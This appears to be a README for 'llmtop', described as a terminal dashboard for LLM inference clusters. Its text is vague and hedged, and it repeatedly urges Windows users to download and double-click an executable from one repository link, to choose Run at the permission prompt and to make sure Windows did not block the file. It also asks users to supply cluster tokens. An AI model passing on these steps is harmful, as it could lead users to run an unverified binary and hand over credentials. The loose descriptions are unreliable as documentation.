# 🖥️ llmtop - Watch Your LLM Cluster Live

[![Download Now](https://img.shields.io/badge/Download-llmtop-blue?style=for-the-badge)](https://github.com/Aubretteweakening512/llmtop)

## 🧭 What llmtop does

llmtop is a terminal tool that shows the live state of your LLM inference cluster. It gives you a clear view of GPU use, running jobs, node load, and cluster health in one place.

It is built for people who want to check their inference setup without digging through many screens. You open it in a terminal, and it shows what your cluster is doing right now.

## 📥 Download and run on Windows

Use this page to download and run this file:

https://github.com/Aubretteweakening512/llmtop

### Steps

1. Open the link above in your browser.
2. Download the Windows version from the page.
3. If the file comes in a ZIP file, right-click it and choose Extract All.
4. Open the extracted folder.
5. Find the llmtop app or executable file.
6. Double-click it to start the tool.
7. If Windows asks for permission, choose Run.

If the app opens in a terminal window, that is expected. llmtop is made for the command line.

## 🪟 Windows requirements

llmtop works best on recent Windows versions, such as Windows 10 or Windows 11.

You will also want:

- A working internet connection for setup and cluster access
- Permission to open terminal apps
- Access to your LLM cluster or a test cluster
- A modern GPU stack if you plan to monitor GPU nodes

If your cluster uses tools like Kubernetes, vLLM, or SGLang, llmtop helps you watch those services in one place.

## 🚀 First launch

After you open llmtop for the first time, it should show a live dashboard in your terminal.

You can use it to view:

- GPU load
- Memory use
- Running inference jobs
- Node status
- Service activity
- Cluster pressure
- Slow or busy machines

The screen updates in real time, so you can keep it open while your cluster runs.

## 🧩 What you can expect

llmtop is made to feel like htop, but for LLM inference systems. Instead of checking one server at a time, you get a cluster view.

Typical use cases:

- Check which GPU node is busiest
- See whether inference workers are healthy
- Watch memory use during model loading
- Spot gaps in cluster activity
- Keep an eye on Kubernetes-based inference services
- Review the state of vLLM or SGLang workloads

## ⌨️ Basic controls

llmtop is simple to use once it starts.

Common controls may include:

- Arrow keys to move through lists
- Enter to open more detail
- R to refresh the screen
- Q to quit the app
- H to view help

Some builds may also support search and filters so you can focus on one node, one job, or one service.

## 🔍 Main screen layout

The main screen is usually split into clear sections so you can read status fast.

You may see:

- A top bar with cluster name and time
- A node list with health and load
- GPU rows with memory and compute use
- Job rows for active inference tasks
- Alerts for overloaded nodes
- Status lines for Kubernetes or service state

The goal is to make the cluster easy to scan at a glance.

## 🛠️ Common setup flow

If you want the smoothest setup, use this order:

1. Download llmtop from the link above.
2. Extract the files if needed.
3. Open a terminal window on Windows.
4. Run the app from the folder where you saved it.
5. Connect it to your cluster using the built-in prompt or config file.
6. Check that you can see nodes and GPU data.
7. Leave it open while you work.

If you use a config file, keep it in the same folder at first. That makes setup easier.

## 🔐 Access to your cluster

llmtop needs a way to read cluster status. That can come from a local config file, an API endpoint, or your cluster access settings.

You may need details such as:

- Cluster address
- Token or login key
- Namespace name
- Node group name
- GPU service name

If your team already uses Kubernetes, you may be able to point llmtop at the same cluster settings you use for other tools.

## 🧠 Best fit for these tools

llmtop fits well with clusters that run:

- Kubernetes
- vLLM
- SGLang
- GPU inference jobs
- Terminal-based admin tools
- LLM worker fleets

If you manage one node or many nodes, llmtop gives you a simple view of what is happening now.

## 🖥️ Why use a terminal tool

A terminal tool keeps all key data in one screen.

That helps when you want to:

- Check status fast
- Work over SSH
- Avoid heavy dashboards
- Keep resource use low
- Watch multiple machines from one place

For LLM inference work, this can save time when a model starts slow or a node gets busy.

## 📁 File layout you may see

After download, the folder may include:

- The main llmtop app
- A config file
- A README file
- Sample settings
- Logs or cache files

If you see a config sample, copy it before editing. That keeps the original file safe.

## 🧪 Simple checks if it does not open

If llmtop does not start on Windows, try these steps:

1. Make sure the files finished downloading.
2. Extract the ZIP file if you downloaded one.
3. Run the app from a normal folder like Downloads or Desktop.
4. Check that Windows did not block the file.
5. Open the app from PowerShell or Command Prompt if needed.
6. Confirm that your cluster address and access key are correct.

If the screen opens but shows no data, the app may not yet be connected to your cluster.

## 🧭 Tips for first-time users

Start with one cluster before you connect many systems.

Keep these tips in mind:

- Use a simple folder name with no special characters
- Store your config file in one place
- Test with one node first
- Keep the terminal window open while you watch the cluster
- Check your GPU node names match the names in your cluster setup

This makes it easier to see if the app is working as expected.

## 📊 What the data means

If you are new to cluster tools, a few terms help:

- GPU use: how much of the graphics card is busy
- Memory use: how much GPU memory is in use
- Node: one machine in your cluster
- Job: one inference task or service
- Health: whether a node is up and working
- Load: how busy a node is

You do not need deep technical knowledge to use the display. The point is to make the cluster easier to read.

## 🔄 Keeping track during work

Many people leave llmtop open while they run tests, deploy models, or scale workers.

It can help you watch:

- Model startup time
- Worker restarts
- Sudden GPU spikes
- Memory pressure
- Node dropouts
- Changes after a deployment

That gives you a clear view of how the cluster reacts to your changes.

## 🧰 Suggested folder and launch setup

A clean setup on Windows can look like this:

- Save the download in Downloads
- Extract it to a folder like `C:\llmtop`
- Keep the config file in the same folder
- Open a terminal in that folder
- Run the app from there

A simple folder path makes it easier to find the files again later.

## 🧷 Help for cluster admins

If you manage the cluster for a team, llmtop can help you:

- Check node health before users notice issues
- Watch GPU use during model rollouts
- Spot overloaded machines
- Compare usage across services
- Keep a live view of inference traffic

That makes it easier to react when one part of the cluster starts to slow down.

## 📌 Repo link

Primary download page:

https://github.com/Aubretteweakening512/llmtop

## 🧾 Example use flow

A simple day with llmtop may look like this:

1. Start Windows.
2. Open the folder with llmtop.
3. Launch the app.
4. Connect to your inference cluster.
5. Watch GPU and job status.
6. Leave it open while models run.
7. Check for load spikes or node issues.

This keeps your cluster view close at hand without opening a full web dashboard.